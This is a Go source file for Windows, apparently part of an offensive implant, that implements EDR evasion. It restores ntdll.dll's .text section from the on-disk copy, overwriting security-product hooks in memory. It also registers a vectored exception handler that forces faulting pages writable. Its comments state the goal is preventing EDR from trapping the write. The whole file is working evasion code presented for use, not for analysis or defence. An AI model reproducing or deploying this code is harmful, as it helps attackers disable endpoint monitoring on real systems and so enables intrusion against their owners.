//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// VEH-based ntdll unhooking: restore original ntdll .text section from disk.
// Uses a VEH handler to catch access violations during the restore operation,
// preventing EDR from trapping the write via page-guard or breakpoint hooks.

var (
	procAddVectoredExceptionHandler    = kernel32.NewProc("AddVectoredExceptionHandler")
	procRemoveVectoredExceptionHandler = kernel32.NewProc("RemoveVectoredExceptionHandler")
)

// vehHandler is the VEH exception handler callback.
// It catches STATUS_ACCESS_VIOLATION (0xC0000005) during the unhook process,
// makes the target page writable via VirtualProtect, and signals retry.
//
//go:uintptrescapes
func vehHandler(exceptionInfo uintptr) uintptr {
	rec := (*struct {
		code      uint32
		flags     uint32
		record    uintptr
		address   uintptr
		numParams uint32
		params    [15]uintptr
	})(unsafe.Pointer(exceptionInfo))
	// EXCEPTION_ACCESS_VIOLATION
	if rec.code != 0xC0000005 {
		return 0 // continue searching
	}
	// Attempt to make the faulting page writable
	var oldProtect uint32
	addr := rec.params[1] // faulting address
	procVirtualProtect.Call(addr&^0xFFF, 0x1000, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
	return 1 // EXCEPTION_CONTINUE_EXECUTION
}

// unhookNtdll restores ntdll .text section from disk, with VEH protection.
func unhookNtdll() string {
	// Register VEH handler before touching ntdll
	vehHandle, _, _ := procAddVectoredExceptionHandler.Call(1, uintptr(syscall.NewCallback(vehHandler)))
	if vehHandle == 0 {
		return "VEH Unhook: failed to register VEH handler"
	}
	defer procRemoveVectoredExceptionHandler.Call(vehHandle)

	// Get ntdll base address
	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "VEH Unhook: ntdll.dll not loaded"
	}

	// Read DOS header
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(hMod))
	if dosHeader.eMagic != 0x5A4D {
		return "VEH Unhook: invalid DOS header"
	}

	// Read NT headers
	ntHeaders := (*imageNTHeaders64)(unsafe.Pointer(hMod + uintptr(dosHeader.eLfanew)))
	if ntHeaders.signature != 0x00004550 {
		return "VEH Unhook: invalid NT signature"
	}

	// Find .text section
	var textSection *imageSectionHeader
	sectionHeaders := (*[1 << 10]imageSectionHeader)(unsafe.Pointer(
		uintptr(unsafe.Pointer(&ntHeaders.optionalHeader)) + unsafe.Sizeof(ntHeaders.optionalHeader),
	))
	sectionCount := int(ntHeaders.fileHeader.numberOfSections)

	for i := 0; i < sectionCount; i++ {
		sh := &sectionHeaders[i]
		name := string(sh.name[:])
		if name == ".text" {
			textSection = sh
			break
		}
	}
	if textSection == nil {
		return "VEH Unhook: .text section not found"
	}

	// Read original .text from disk via ntdll.dll file mapping
	origData := readNtdllFromDisk(textSection)
	if origData == nil {
		return "VEH Unhook: failed to read ntdll from disk"
	}

	// Make .text writable and replace
	textAddr := hMod + uintptr(textSection.virtualAddress)
	textSize := textSection.sizeOfRawData
	if textSize == 0 {
		textSize = textSection.virtualSize
	}

	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(textAddr, uintptr(textSize), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "VEH Unhook: VirtualProtect failed"
	}

	for i := 0; i < len(origData); i++ {
		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = origData[i]
	}

	// Restore original page protection
	procVirtualProtect.Call(textAddr, uintptr(textSize), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return fmt.Sprintf("VEH Unhook: ntdll .text section restored (%d bytes, VA=0x%x)", len(origData), textAddr)
}

func readNtdllFromDisk(section *imageSectionHeader) []byte {
	ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
	k32 := syscall.NewLazyDLL("kernel32.dll")
	createFile := k32.NewProc("CreateFileW")
	setFilePointer := k32.NewProc("SetFilePointer")
	readFile := k32.NewProc("ReadFile")
	closeHandle := k32.NewProc("CloseHandle")

	pathPtr, _ := syscall.UTF16PtrFromString(ntdllPath)
	hFile, _, _ := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0x80000000,
		1,
		0,
		3,
		0x80,
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		return nil
	}
	defer closeHandle.Call(hFile)

	// Seek to .text section file offset before reading
	setFilePointer.Call(hFile, uintptr(section.pointerToRawData), 0, 0)

	buf := make([]byte, section.sizeOfRawData)
	var read uint32

	ret, _, _ := readFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&read)),
		0,
	)
	if ret == 0 {
		return nil
	}

	return buf[:read]
}
